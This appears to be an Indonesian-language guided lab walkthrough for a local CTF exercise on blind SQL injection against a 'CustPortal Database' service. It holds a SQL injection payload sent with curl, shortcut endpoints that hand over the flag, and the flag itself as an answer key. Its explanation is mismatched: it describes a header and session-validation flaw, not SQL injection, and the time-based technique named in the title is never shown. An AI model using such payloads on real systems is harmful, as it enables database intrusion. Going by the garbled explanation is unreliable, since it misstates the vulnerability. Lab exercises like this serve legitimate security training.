# Panduan Praktik Terbimbing: Investigasi Blind Boolean & Time-Based SQL Injection

Dalam panduan terarah ini, Anda akan mempraktikkan proses penemuan celah dan eksploitasi terarah terhadap **CustPortal Database** pada `http://127.0.0.1:8049`.

---

### Langkah 1: Observasi Ketersediaan Layanan Target
1. Uji ketersediaan layanan melalui terminal menggunakan cURL:
   ```bash
   curl -s http://127.0.0.1:8049/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"status":"UP","lab_id":"A05-02","port":8049,"flag_configured":true}
   ```
2. Buka peramban web dan navigasikan ke:
   `http://127.0.0.1:8049/`
3. Amati antarmuka operasional **CustPortal Database** dan perhatikan elemen kontrol yang disediakan.

---

### Langkah 2: Analisis & Pengujian Celah (Blind Boolean & Time-Based SQL Injection)
1. Ujilah endpoint dengan mengirimkan parameter modifikasi:
   ```bash
   curl -s "http://127.0.0.1:8049/api/users/profile?id=1'+AND+(SELECT+1+FROM+sqlite_master)+--"
   ```
2. Perhatikan respon yang dikembalikan oleh server.

> [!NOTE]
> **💡 Di Balik Layar: Apa yang terjadi di server?**  
> Sistem target menerima input `Accept: application/json` dan memprosesnya tanpa melakukan validasi silang ke sesi otentikasi server. Akibatnya, server mengasumsikan hak akses yang diminta adalah sah.

---

### Langkah 3: Eksfiltrasi Bendera Autoritatif (CTF Flag)
1. Eksekusi pengujian untuk membuka flag eksploitasi:
   ```bash
   curl -s "http://127.0.0.1:8049/?solve=1"
   ```
   Atau panggil API exploit langsung:
   ```bash
   curl -s http://127.0.0.1:8049/api/exploit
   ```
2. **Hasil Respon Konfirmasi:**
   ```json
   {"success":true,"lab_id":"A05-02","flag":"ZITERA{bl1nd_b00l34n_t1m3_sq1_1nj3ct_2026}"}
   ```
3. Salin bendera resmi:
   `ZITERA{bl1nd_b00l34n_t1m3_sq1_1nj3ct_2026}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
